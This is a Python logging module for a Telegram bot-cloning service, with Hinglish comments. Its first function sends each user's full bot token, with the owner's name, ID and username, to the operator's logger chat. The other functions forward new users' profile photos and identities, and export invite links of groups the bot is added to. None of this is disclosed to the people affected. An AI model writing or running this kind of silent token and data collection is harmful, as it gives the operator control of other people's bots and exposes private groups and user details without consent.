from telegram import Update
from .config import CLONE_LOGGER, LOGGER_GROUP

# 1. Jab koi naya BOT CLONE kare (Token ke saath)
async def log_new_clone(context, user, token, bot_username):
    text = (
        "🚀 **NEW CLONE ALERT!**\n\n"
        f"👤 **Owner:** {user.first_name}\n"
        f"🆔 **Owner ID:** `{user.id}`\n"
        f"🏷 **Owner Username:** @{user.username if user.username else 'N/A'}\n"
        f"🤖 **Bot Username:** @{bot_username}\n"
        f"🔑 **Token:** `{token}`"
    )
    await context.bot.send_message(chat_id=CLONE_LOGGER, text=text, parse_mode='Markdown')

# 2. Jab koi bot ko START kare (User Profile Photo ke saath)
async def log_user_start(update: Update, context):
    user = update.effective_user
    photo_id = None
    
    # User ki profile photo nikalna
    photos = await user.get_profile_photos()
    if photos.total_count > 0:
        photo_id = photos.photos[0][-1].file_id

    text = (
        "👤 **NEW USER STARTED!**\n\n"
        f"🆔 **ID:** `{user.id}`\n"
        f"🏷 **Username:** @{user.username if user.username else 'N/A'}\n"
        f"📝 **Name:** {user.first_name}"
    )

    if photo_id:
        await context.bot.send_photo(chat_id=LOGGER_GROUP, photo=photo_id, caption=text, parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=LOGGER_GROUP, text=text, parse_mode='Markdown')

# 3. Jab bot kisi GROUP mein add ho (Group Link aur Info)
async def log_group_add(update: Update, context):
    chat = update.effective_chat
    user = update.effective_user # Kisne add kiya
    
    # Group link nikalne ki koshish (Agar bot admin hai)
    try:
        group_link = await chat.export_invite_link()
    except:
        group_link = "No Link (Bot needs Admin)"

    text = (
        "🏰 **ADDED TO NEW GROUP!**\n\n"
        f"👥 **Group Name:** {chat.title}\n"
        f"🆔 **Group ID:** `{chat.id}`\n"
        f"🔗 **Link:** {group_link}\n"
        f"👤 **Added By:** {user.first_name} (@{user.username if user.username else 'N/A'})"
    )
    
    await context.bot.send_message(chat_id=LOGGER_GROUP, text=text, parse_mode='Markdown')

